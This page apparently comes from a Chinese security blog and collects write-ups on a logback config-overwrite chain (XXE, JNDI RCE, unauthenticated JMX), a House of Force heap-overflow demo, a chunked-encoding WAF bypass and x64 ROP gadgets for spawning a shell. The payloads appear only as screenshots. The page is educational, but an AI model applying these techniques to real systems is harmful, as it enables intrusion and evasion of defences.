            <p>来源：<a href="https://mp.weixin.qq.com/s/OBwxaijYCjnvo8I0OBusug" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-01-logo.png" alt="logo"></p>
<h2 id="logback"><a href="#logback" class="headerlink" title="logback"></a>logback</h2><p><code>logback</code> 是 <code>log4j</code> 创始人设计的另一个开源日志组件。相比 <code>log4j</code>，重构了内核的 <code>logback</code> 的优势在于性能更高（关键路径性能提升十倍）、内存占用更小、文档更完善、功能更全面等等。<code>Github</code> 上的数据显示，<code>logback</code> 被八千多个项目所使用，包括 <code>springboot</code> 在内的多个框架已经使用 <code>logback</code> 作为默认的日志组件。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-02-github.png" alt="github"></p>
<p>初步分析了一下 <code>logback</code> 库，有一些有趣的发现。</p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p><code>logback</code> 查找配置文件的函数在<code>ContextInitializer.findURLOfDefaultConfigurationFile()</code>，首先读取启动参数 <code>logback.configurationFile</code> 来获取配置文件的地址（支持远端 <code>URL</code>地址）。如果找不到，再去 <code>classpath</code> 下依次查找如下三个文件作为配置文件：</p>
<ul>
<li><p>a) logback-test.xml</p>
</li>
<li><p>b) logback.groovy（最新版本似乎不再支持）</p>
</li>
<li><p>c) logback.xml</p>
</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-03-configfile.png" alt="configfile"></p>
<p>获取配置文件之后，通过 <code>JoranConfigurator.doConfigure()</code> (实现在父类的<code>GenericConfigurator.doConfigure()</code>中) 读取 <code>xml</code> 配置文件，其中调用 <code>SaxEventRecorder.recordEvents()</code> 解析 <code>xml</code> 配置文件时存在 <code>XXE</code> 漏洞。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-04-xxe-01.png" alt="xxe-01"> </p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-05-xxe-02.png" alt="xxe-02"></p>
<h2 id="动态加载"><a href="#动态加载" class="headerlink" title="动态加载"></a>动态加载</h2><p>通常情况下，配置文件的这一类 <code>XXE</code> 漏洞并不是大问题，毕竟配置文件只会在初始化的时候加载一次，攻击者没机会触发漏洞。但是 <code>logback</code> 库不一样。只要配置文件中配置了 <code>scan</code> 属性，它就会启动一个 <code>scan task</code> 监控配置文件的变动，支持配置文件变更时的自动加载。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-06-scantask.png" alt="scan-task"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-07-scan-doc.png" alt="scan-doc"></p>
<p>也就是说，我们有机会通过上传覆盖 <code>logback</code> 的 <code>xml</code> 配置文件来触发 <code>XXE</code> 漏洞。触发条件是：</p>
<ul>
<li><p>a) <code>logback</code> 配置文件中配置了 <code>scan</code> 属性</p>
</li>
<li><p>b) <code>logback</code> 配置文件是以文件形式保存。</p>
</li>
</ul>
<p>第二个条件是因为代码 <code>convertToFile()</code> 中的一个限制：配置文件 <code>URL</code> 必须以 <code>file://</code> 开始。如果像 <code>springboot</code> 那样，把配置文件保存在 <code>jar</code> 包中，配置文件的 <code>URL</code> 以 <code>jar://</code> 开始，就不会启动实时监控的 <code>scan task</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-08-convert-to-file.png" alt="convert"></p>
<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>除了自动更新之外，<code>logback</code> 的配置文件还有一个更强大的功能：利用 <code>JNDI</code> 的 <code>RPC</code> 功能从远端来读取内容，只要在配置文件中配置 <code>&lt;insertFromJNDI&gt;</code> 标签就行了，JNDI的远端路径就配置在这个标签的 <code>env-entry-name</code> 属性中。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-09-env-entry-name.png" alt="env-entry-name"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-10-jndi-lookup.png" alt="jndi-lookup"></p>
<p>梳理一下，如果一个 <code>web</code> 应用满足如下三个条件：</p>
<ul>
<li>a) <code>logback</code> 配置文件以文件形式保存</li>
<li>b) <code>logback</code> 配置文件中配置了 <code>scan</code> 属性</li>
<li>c) 有上传接口可以覆盖 <code>logback</code> 配置文件</li>
</ul>
<p>我们就可以通过覆盖 <code>logback</code> 配置文件，来实现 <code>XXE</code> 攻击，以及 <code>JNDI</code> 的远程 <code>RCE</code>。 </p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>验证一下。</p>
<ul>
<li>a) 从 <code>github</code> 上拉取 <code>spring-mvc-showcase</code> 项目，将 <code>pom.xml</code> 中 <code>log4j</code> 的 <code>dependency</code> 修改为 <code>logback</code>，增加 <code>logback.xml</code> 配置文件，并配置 <code>scan</code> 属性。</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-12-pom-xml.png" alt="pom"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-11-spring-mvc-showcase.png" alt="showcase"></p>
<ul>
<li>b) 通过tomcat运行war包。写一个上传接口，其中存在跨目录文件上传漏洞</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-13-jsp-upload-vuln.png" alt="upload"></p>
<ul>
<li>c) 通过上传接口覆盖 <code>logback.xml</code>文件，增加<insertfromjndi>标签，指定恶意的jndi服务。</insertfromjndi></li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-14-replace-xml.png" alt="replace"></p>
<ul>
<li>c) 等待一个扫描周期（配置文件中配置的 <code>30</code> 秒）之后，恶意 <code>JNDI</code> 地址收到了访问请求，恶意程序成功执行。</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-15-rce-calc.png" alt="rce"></p>
<h2 id="JMX"><a href="#JMX" class="headerlink" title="JMX"></a>JMX</h2><p>不仅如此，<code>logback</code> 还实现了 <code>jmx</code> 的 <code>MBeans</code> 接口。只要在配置文件中配置 <code>&lt;jmxConfigurator /&gt;</code> 的空标签，<code>web</code> 应用就会开放 <code>jmx</code> 端口，供 <code>jconsole</code> 进行连接和调用。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-16-jmx-configurator.png" alt="jmx-configurator"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-17-jmx-doc.png" alt="mbean-interface"> </p>
<p>在JMXConfigurator这个MBean中，公开给jconsole调用的接口如下。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-18-mbean-interface.png" alt="mbean"></p>
<p>验证一下。</p>
<ul>
<li>a) 在之前的环境上，我们重新上传一个 <code>logback.xml</code>，配置上 <code>&lt;jmxConfigurator/&gt;</code> 标签。</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-19-upload-jmx.png" alt="upload"></p>
<ul>
<li>b) 等待一个周期查看tomcat进程，发现多了一个39327端口。</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-20-org-port-list.png" alt="org-port"> </p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-21-new-port-list.png" alt="new-port"></p>
<ul>
<li>c) 使用 <code>jconsole</code> 连接，无需认证即可登录。可以直接查看 <code>tomcat</code> 的管理属性，以及调用 <code>tomcat</code> 和 <code>logback</code> 提供的 <code>MBeans</code> 操作接口。</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/logback-22-jconsole.png" alt="jconsole"> </p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>logback</code> 通过 <code>scan</code> 参数提供了配置文件的动态更新功能。如果可以覆盖这个配置文件，就可以实现XXE、JNDI、jmx等多种攻击方式了。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2019/12/15/【堆溢出】从一个例子学习 House of Force/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/15/【堆溢出】从一个例子学习 House of Force/" itemprop="url">【堆溢出】从一个例子学习 House of Force</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-15T00:00:00+08:00">
                2019-12-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="【堆溢出】从一个例子学习-House-of-Forcet"><a href="#【堆溢出】从一个例子学习-House-of-Forcet" class="headerlink" title="【堆溢出】从一个例子学习 House of Forcet"></a>【堆溢出】从一个例子学习 House of Forcet</h1><p>来源：<a href="https://mp.weixin.qq.com/s/1puywyLUjuFi5I5SlPi2BQ" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
<p><strong>House of Foce</strong> 是堆溢出在特定场景下的一种简单利用方式，通过一个例子来学习下。</p>
<p>首先看下运行环境， <strong>Ubuntu 16.04.1 LTS x64</strong> 中 <strong>Ubuntu GLIBC 2.23-0ubuntu10</strong> 版本的 <strong>GLIBC</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-01-ubuntu-runtime.png" alt="01-runtime"></p>
<p>再看下源码，有四次 <strong>malloc()</strong> 调用，中间夹着一次模拟溢出的内存改写。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-02-program.png" alt="02-program"></p>
<p>上 <strong>gdb</strong>，调试走起，我们一句一句的看。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-03-gdb.png" alt="03-gdb"></p>
<h2 id="第一个-malloc：16"><a href="#第一个-malloc：16" class="headerlink" title="第一个 malloc：16"></a>第一个 malloc：16</h2><p>现在是在调用第一个 <strong>malloc(16)</strong> 之前的状态。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-04-before-first-malloc.png" alt="04-before-first-malloc"></p>
<p>可以看到，堆 <strong>heap</strong> 还没有分配出来（<strong>main_arena</strong>的<strong>top</strong>字段等于<strong>0</strong>，<strong>vmmap</strong> 还没有 <strong>heap</strong> 的内存段）。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-05-main_arena-vmmap.png" alt="05-main_arena-vmmap"></p>
<p>按 <strong>ni</strong> 执行 <strong>malloc(16)</strong>之后，返回值是 <strong>0x602010</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-06-601020.png" alt="06-601020"></p>
<p>此时 <strong>main_arena</strong> 的 <strong>top</strong> 指针指向 <strong>0x602020</strong>，而vmmap 的 <strong>heap</strong> 段起始于 <strong>0x602000</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-07-main_arena-vmmap.png" alt="07-main_arena-vmmap"></p>
<p>看看 <strong>0x602000</strong> 起始的这段堆内存的情况。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-08-602000.png" alt="08-602000"></p>
<p><strong>0x602000</strong> 到 <strong>0x60201F</strong> 的这 <strong>32</strong> 字节内存，就是 <strong>malloc(16)</strong> 所占用的堆内存。其中，前 <strong>16</strong> 个字节（<strong>0x602000</strong> ~ <strong>0x60200F</strong>）是 <strong>GLIBC</strong> 管理的堆头，后 <strong>16</strong> 个字节（<strong>0x602010</strong> ~ <strong>0x60201F</strong>）是返回给程序使用的空间，所以 <strong>malloc(16)</strong> 的返回值就是 <strong>0x602010</strong>。而 <strong>main_arena</strong> 的 <strong>top</strong> 指针指向空闲堆块的起始地址 <strong>0x602020</strong>。示意图如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-09-heap.png" alt="09-heap"></p>
<h2 id="模拟溢出的内存改写"><a href="#模拟溢出的内存改写" class="headerlink" title="模拟溢出的内存改写"></a>模拟溢出的内存改写</h2><p>接下来源码的 <strong>10</strong> 和 <strong>11</strong> 两行，是模拟用溢出的方式修改空闲内存块的 <strong>size</strong> 大小为 <strong>全F</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-10-line-10-11.png" alt="10-line-10-11"></p>
<p>修改成功。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-11-overflow-to-trunk-size.png" alt="11-overflow-to-trunk-size"></p>
<p>为什么要修改空闲内存块的大小为 <strong>全F</strong>？是为了下一步申请超大内存时，避免因为空闲内存块大小不够而返回失败。继续看源码的第 <strong>13</strong> 行，第二个<strong>malloc()</strong>，申请负数大小的内存。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-12-line-13.png" alt="12-line-13"></p>
<h2 id="第二个-malloc：-4128"><a href="#第二个-malloc：-4128" class="headerlink" title="第二个 malloc：-4128"></a>第二个 malloc：-4128</h2><p>从汇编可以看出，由于 <strong>malloc</strong> 的入参格式是正整数，因此程序运行时会将负数 <strong>-4128</strong> 转换成超大整数 <strong>0xFFFFFFFFFFFFEFE0</strong>.</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-13-minus-4128.png" alt="13-minus-4128"></p>
<p>我们计算一下，这一次堆块分配，从空闲堆块起始位置 <strong>0x602020</strong> 开始，加上 <strong>16</strong> 字节的堆头，再减去 <strong>4128</strong> 之后，应该是 <strong>0x601010</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-14-calculator.png" alt="14-calculator"></p>
<p>看看执行 <strong>malloc(-4128)</strong> 之后，<strong>main_arena</strong> 的 top 指针，果然指向了 <strong>0x601010</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-15-main_arena-after-second-malloc.png" alt="15-main_arena-after-second-malloc"></p>
<p>而 <strong>0x601010</strong> 所在的区域，就是程序的 <strong>GOT</strong> 表。其中 <strong>0x601018</strong> 是 <strong>libc_start_main()</strong> 函数的 <strong>GOT</strong> 表项地址，<strong>0x601020</strong> 是 <strong>malloc()</strong> 函数的 <strong>GOT</strong> 表项地址。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-16-got-table.png" alt="16-got-table"></p>
<p>也就意味着，堆块的内存分配已经被程序劫持到了 <strong>GOT</strong> 表中。此时堆块的示意图如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-17-heap-image.png" alt="17-heap-image"></p>
<h2 id="第三个-malloc：16"><a href="#第三个-malloc：16" class="headerlink" title="第三个 malloc：16"></a>第三个 malloc：16</h2><p>第三个 <strong>malloc()</strong> 分为两步，首先是分配 <strong>16</strong>个字节，然后再向分配的内存中写入 <strong>main()</strong> 函数地址。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-18-set-to-main.png" alt="18-set-to-main"></p>
<p>分配 <strong>16</strong> 个字节之后，main_arena的top指针是 <strong>0x602030</strong>，返回给程序的地址是 <strong>0x601020</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-19-malloc-16-third.png" alt="19-malloc-16-third"></p>
<p>注意到 <strong>0x601020</strong> 其实是 <strong>malloc()</strong> 的 <strong>GOT</strong> 表项地址，现在被 <strong>malloc()</strong> 输出到了程序里。当源码中用 <strong>*(long *)p = (long)main;</strong> 来修改分配的内存时，我们其实是覆盖了 <strong>malloc()</strong> 函数的 <strong>GOT</strong> 表项值，也就是说， <strong>malloc()</strong> 函数被劫持成了 <strong>main()</strong> 函数！</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-20-hijacked-to-main.png" alt="20-hijacked-to-main"></p>
<p>示意图如下</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-21-overflow-malloc-to-main.png" alt="21-overflow-malloc-to-main"></p>
<h2 id="第四个-malloc：16"><a href="#第四个-malloc：16" class="headerlink" title="第四个 malloc：16"></a>第四个 malloc：16</h2><p>第四个 <strong>malloc()</strong> 就是分配 <strong>16</strong> 个字节。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-22-malloc-fourth.png" alt="22-malloc-fourth"></p>
<p>但此时，<strong>malloc()</strong> 的 <strong>GOT</strong> 表项值已经被劫持成了 <strong>main()</strong> 函数地址。我们按 <strong>si</strong> 单步调试 <strong>step into</strong>，会发现 <strong>rip</strong> 走进了 <strong>main()</strong> 函数的空间。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-23-si.png" alt="23-si"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/hof-24-rip-to-main.png" alt="24-rip-to-main"></p>
<p>程序的流程被成功劫持！</p>
<h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>回顾一下，这个程序是怎么做到劫持运行流程导致重入了 <strong>main()</strong> 函数？其实只做了两件事情：</p>
<ul>
<li>修改了空闲堆块的 <strong>size</strong> 字段，从而避免下一步空间不够</li>
<li>控制了 <strong>malloc()</strong> 申请的字节数，从而分配了超大空间</li>
</ul>
<p>这就是 <strong>House of Force</strong> 的堆溢出利用技术。通常，这种利用方式需要满足两个条件：</p>
<ul>
<li>需要存在溢出漏洞，攻击者可以控制空闲堆块的 <strong>size</strong> 字段</li>
<li>攻击者可以控制 <strong>malloc</strong> 的字节数和 <strong>malloc</strong> 的调用次数</li>
</ul>
<p>只要满足这些条件，就可以利用例子中的方法抬高或者压低空闲堆块的地址，从而获得任意地址写的机会。</p>
<p>当然，不同版本 <strong>GLIBC</strong> 的堆块分配和处理方法都略有差异，真实利用时还需要在对应版本的 <strong>GLIBC</strong> 上仔细分析。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2019/07/20/利用 Transfer-Encoded-Chunked 绕过 WAF 实战/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/20/利用 Transfer-Encoded-Chunked 绕过 WAF 实战/" itemprop="url">利用 Transfer-Encoding：Chunked 绕过 WAF</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-20T00:00:00+08:00">
                2019-07-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="利用-Transfer-Encoding-Chunked-绕过-WAF-实战"><a href="#利用-Transfer-Encoding-Chunked-绕过-WAF-实战" class="headerlink" title="利用 Transfer-Encoding: Chunked 绕过 WAF 实战"></a>利用 Transfer-Encoding: Chunked 绕过 WAF 实战</h1><p>来源：<a href="https://mp.weixin.qq.com/s/XFzWrmOT-FhrneXjdG5pUQ" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
<p>找到一个部署了 <code>WAF</code> 的站点。先发一个报文，删除了 <code>cookie</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/waf-01-normal-request.png" alt="01-normal-request"></p>
<p>可以看到服务端返回了 403，证明请求已经到达服务端了。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/waf-02-response.png" alt="02-normal-response"></p>
<p>接下来，在报文中增加无意义的 <code>/etc/passwd</code>，触发 <code>WAF</code> 拦截规则。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/waf-03-inject-request.png" alt="waf-03-inject-request"></p>
<p>无法收到响应，请求被 <code>WAF</code> 拦截。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/waf-04-none-response.png" alt="waf-04-none-response"></p>
<p>现在我们看看怎么绕过WAF。<code>bypassword</code> 在 <a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">《在HTTP协议层面绕过WAF》</a> 中提出了使用 <code>Transfer-Encoding:chunked</code> 来绕过 <code>WAF</code> 的方案，原理是将请求报文的<code>body</code>部分切分成多份来绕过WAF规则。我们来试试。</p>
<p>上一个请求需要做三点改动：  </p>
<ul>
<li>请求的header部分，增加一个 “Tranfer-Encoding: chunked” 的 header  </li>
<li>请求的body部分切成多份，每一份都是 “Length+换行+Value+换行” 的格式  </li>
<li>body部分的最后，增加 “0+空行+空行” 作为结束符  </li>
</ul>
<p>如下所示。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/waf-05-chunked-request.png" alt="waf-05-chunked-request"></p>
<p>可以看到服务端返回了 <code>403</code>，证明请求已经到达服务端了，顺利通过了 <code>WAF</code> 的检测。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/waf-06-response.png" alt="waf-06-response"></p>
<p><code>360</code> 的 <code>luoye、00theway、zonadu</code> 在<a href="https://www.freebuf.com/articles/web/194351.html" target="_blank" rel="noopener">《利用分块传输吊打所有WAF》</a> 中提到了一个改进方案，就是在每个 <code>Length</code> 和 <code>换行</code> 之间，插入 “分号;”开头的任意注释，进一步混淆 <code>WAF</code> 的处理，就像这样。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/waf-07-chunked-comments-request.png" alt="waf-07-chunked-comments-request"></p>
<p>手工切分 http body 太麻烦了，<code>c0ny1</code> 写了一个 <code>BurpSuite</code> <a href="http://gv7.me/articles/2019/chunked-coding-converter/" target="_blank" rel="noopener">插件</a> 来实现报文的自动切分，代码在 <a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">https://github.com/c0ny1/chunked-coding-converter</a>。插件效果如下。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/waf-08-c0ny1-plugin-repeater-chunked-coding.gif" alt="waf-08-c0ny1-plugin-repeater-chunked-coding"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/waf-09-c0ny1-plugin-sqlmap-bypassWAF.gif" alt="waf-09-c0ny1-plugin-sqlmap-bypassWAF"></p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ul>
<li><a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">在HTTP协议层面绕过WAF</a></li>
<li><a href="https://www.freebuf.com/articles/web/194351.html" target="_blank" rel="noopener">利用分块传输吊打所有WAF</a></li>
<li><a href="http://gv7.me/articles/2019/chunked-coding-converter/" target="_blank" rel="noopener">编写Burp分块传输插件绕WAF</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2019/06/30/Linux x64下的万能Gadget/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/30/Linux x64下的万能Gadget/" itemprop="url">Linux x64 下的万能 Gadget</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-30T00:00:00+08:00">
                2019-06-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Linux-x64-下的万能-Gadget"><a href="#Linux-x64-下的万能-Gadget" class="headerlink" title="Linux x64 下的万能 Gadget"></a>Linux x64 下的万能 Gadget</h1><p>来源：<a href="https://mp.weixin.qq.com/s/5bxE0h7luKIb2Vn353wQgw" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
<h2 id="一、通用-Gadget"><a href="#一、通用-Gadget" class="headerlink" title="一、通用 Gadget"></a>一、通用 Gadget</h2><p>蒸米在《一步一步学ROP之linux_x64篇》中提到，在栈溢出的场景下，只要 <strong>x64</strong> 程序中调用了 <strong>libc.so</strong>，就会自带一个很好用的通用Gadget：<strong>__libc_csu_init()</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/01-rop-__libc_csu_init.png" alt="__libc_csu_init"></p>
<p>如图，先从 <strong>0x40061A</strong> 开始执行，将 <strong>rbx/rbp/r12/r13/r14/r15</strong> 这六个寄存器全部布置好，再 <strong>ret</strong> 到 <strong>0x400600</strong> ，继续布置 <strong>rdx/rsi/rdi</strong>，最后通过 <strong>call qword ptr[r12+rbx*8]</strong> 执行目标函数。</p>
<p>这个通用 <strong>Gadget</strong> 好用的地方在于，不仅可以通过函数地址的指针（通常会用记录库函数真实地址的 <strong>got</strong> 表项）来控制目标函数，还可以控制目标函数的最多三个入参（<strong>rdi/rsi/rdx</strong>）的值。此外，只要设置 <strong>rbp=rbx+1</strong>而且栈空间足够，这个 <strong>Gadget</strong> 可以一直循环调用下去。</p>
<p>计算一下一次调用需要的空间。</p>
<p>可以看出，这个 <strong>Gadget</strong> 需要布置六个寄存器（<strong>rbx/rbp/r12/r13/r14/r15</strong>）加一个 <strong>ret</strong> 返回地址，<strong>x64</strong> 下至少需要 <strong>56</strong> 个字节的栈空间。如果再算上将 <strong>rip</strong> 指令跳转进来（0x40061A）的一个 <strong>ret</strong> 地址，那就是 <strong>64</strong> 字节的栈空间。</p>
<p>栈的布置如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/02-rop-stack-1.png" alt="stack-1"></p>
<h2 id="二、隐藏-Gadget：pop-rdi-ret"><a href="#二、隐藏-Gadget：pop-rdi-ret" class="headerlink" title="二、隐藏 Gadget：pop rdi,ret"></a>二、隐藏 Gadget：pop rdi,ret</h2><p>其实，这个通用 <strong>Gadget</strong> 里，还隐藏了两个更好用的 <strong>Gadget</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/03-original-pop-r14-r15.png" alt="pop-r14-r15"></p>
<p>将地址 <strong>0x400622</strong> 上 <strong>pop r15,ret</strong> 的三字节指令(<strong>0x41 0x5F 0xC3</strong>)拆散看，会发现后两个字节组成了一组新的指令 <strong>pop rdi,ret</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/03-rop-pop-rdi.png" alt="pop-rdi"></p>
<p>这已经足够完成单入参的函数调用了。</p>
<p>通常栈溢出之后，需要进行如下两步：</p>
<ul>
<li><p>1、通过类似 <strong>puts(puts)</strong> 的方式，泄漏libc库函数的地址，从而通过偏移计算出 <strong>system</strong> 函数和 <strong>“/bin/sh”</strong> 字符串的地址</p>
</li>
<li><p>2、执行 <strong>sytem(“bin/sh”)</strong> 获得系统 <strong>shell</strong></p>
</li>
</ul>
<p>发现没有？大多数情况我们只需要一个入参的函数调用， <strong>__libc_csu_init()</strong> 函数最后的这个 <strong>pop rdi,ret</strong> 可以完美实现上述两个步骤。</p>
<p>空间上，只需要 <strong>24</strong> 个字节（一个 <strong>QWORD</strong> 存放 <strong>ret</strong> 进来的地址，两个 <strong>QWORD</strong> 作为入参和被调用函数地址）的溢出空间就足够啦。</p>
<p>栈的空间布置如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/04-rop-stack-2.png" alt="stack-2"></p>
<p>那，如果需要调用两个入参的函数呢，这个 <strong>Gadget</strong> 也行么？是的。</p>
<h2 id="三、隐藏-Gadget：pop-rsi-…-ret"><a href="#三、隐藏-Gadget：pop-rsi-…-ret" class="headerlink" title="三、隐藏 Gadget：pop rsi,…,ret"></a>三、隐藏 Gadget：pop rsi,…,ret</h2><p>将地址 <strong>0x400620</strong> 上 <strong>pop r14</strong> 的两字节指令（<strong>0x41 0x5E</strong>）拆散，会发现后一个字节是单字节指令 <strong>pop rsi</strong>，可以用来控制第二个入参。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/05-rop-pop-rsi.png" alt="pop-rsi"></p>
<p>和前述的地址 <strong>0x400623</strong> 上的指令 <strong>pop rdi,ret</strong>组合起来，就可以完成两个入参的函数调用。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/06-rop-pop-rsi-rdi-ret.png" alt="pop-rdi-rsi"></p>
<p>只需要将栈布置如下就可以啦。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/07-rop-stack-3.png" alt="stack"></p>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
